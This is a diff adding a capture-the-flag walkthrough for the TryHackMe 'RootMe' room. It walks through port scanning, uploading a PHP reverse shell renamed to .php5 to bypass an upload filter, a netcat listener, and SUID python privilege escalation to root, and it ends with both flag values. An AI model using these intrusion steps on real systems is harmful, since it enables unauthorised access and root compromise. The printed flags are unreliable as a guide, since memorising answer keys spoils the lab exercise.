@@ -1,0 +1,154 @@
+# TryHackMe: RootMe Walkthrough
+
+> A beginner CTF room. Deploy the machine and connect via OpenVPN or AttackBox.
+
+---
+
+## Task 2: Reconnaissance
+
+### Port Scanning
+
+```bash
+nmap -Pn -sS -p- <TARGET_IP>
+```
+
+| Flag | Purpose |
+|------|---------|
+| `-Pn` | Skip host discovery (assume host is up) |
+| `-sS` | TCP SYN scan (stealth scan, doesn't complete handshake) |
+| `-p-` | Scan all 65535 ports |
+
+**Result:** Ports 22 (SSH) and 80 (HTTP) are open.
+
+### Service Version Detection
+
+```bash
+nmap -Pn -sV -sS -p22,80 <TARGET_IP>
+```
+
+| Flag | Purpose |
+|------|---------|
+| `-sV` | Probe open ports to determine service/version info |
+| `-p22,80` | Only scan specified ports |
+
+**Result:** Apache 2.4.41, OpenSSH 8.2p1.
+
+### Directory Enumeration
+
+```bash
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
+```
+
+| Flag | Purpose |
+|------|---------|
+| `dir` | Directory/file enumeration mode |
+| `-u` | Target URL |
+| `-w` | Path to wordlist for brute-forcing |
+
+**Result:** Found `/panel/` (upload form) and `/uploads/` directories.
+
+---
+
+## Task 3: Getting a Shell
+
+### 1. Prepare the Reverse Shell
+
+```bash
+cd /usr/share/webshells/php
+nano php-reverse-shell.php
+```
+
+Edit the file to set your AttackBox IP and listener port (e.g., 4444).
+
+### 2. Bypass PHP Upload Filter
+
+The server blocks `.php` files. Rename to an alternative extension:
+
+```bash
+cp php-reverse-shell.php php-reverse-shell.php5
+```
+
+Upload `php-reverse-shell.php5` via the `/panel/` form.
+
+### 3. Start Netcat Listener
+
+```bash
+nc -lvnp 4444
+```
+
+| Flag | Purpose |
+|------|---------|
+| `-l` | Listen mode (wait for incoming connection) |
+| `-v` | Verbose output |
+| `-n` | Numeric only — no DNS resolution |
+| `-p` | Specify listening port |
+
+Trigger the shell by clicking the uploaded file in `/uploads/`.
+
+### 4. Upgrade Shell
+
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+Spawns an interactive TTY using Python's `pty` module for session stability.
+
+### 5. Find the User Flag
+
+```bash
+find / -type f -name "user.txt" 2>/dev/null
+cat /var/www/user.txt
+```
+
+| Component | Purpose |
+|-----------|---------|
+| `-type f` | Search for files only |
+| `-name "user.txt"` | Match exact filename |
+| `2>/dev/null` | Suppress error messages (permission denied, etc.) |
+
+---
+
+## Task 4: Privilege Escalation
+
+### 1. Find SUID Binaries
+
+```bash
+find / -user root -perm -4000 2>/dev/null
+```
+
+| Flag | Purpose |
+|------|---------|
+| `-user root` | Files owned by root |
+| `-perm -4000` | Files with SUID bit set (runs as file owner) |
+| `2>/dev/null` | Discard error output |
+
+**Result:** `/usr/bin/python2.7` has SUID — unusual and exploitable.
+
+### 2. Escalate to Root
+
+```bash
+python -c 'import os;os.execl("/bin/bash", "sh", "-p")'
+```
+
+| Component | Purpose |
+|-----------|---------|
+| `os.execl()` | Replace current process with a new one |
+| `/bin/bash` | Program to execute |
+| `"sh"` | argv[0] — name bash sees itself as |
+| `"-p"` | Privileged mode — don't drop SUID privileges |
+
+### 3. Get Root Flag
+
+```bash
+find / -type f -name "root.txt" 2>/dev/null
+cat /root/root.txt
+```
+
+---
+
+## Flags
+
+| Flag | Value |
+|------|-------|
+| user.txt | `THM{y0u_g0t_a_sh3ll}` |
+| root.txt | `THM{pr1v1l3g3_3sc4l4t10n}` |
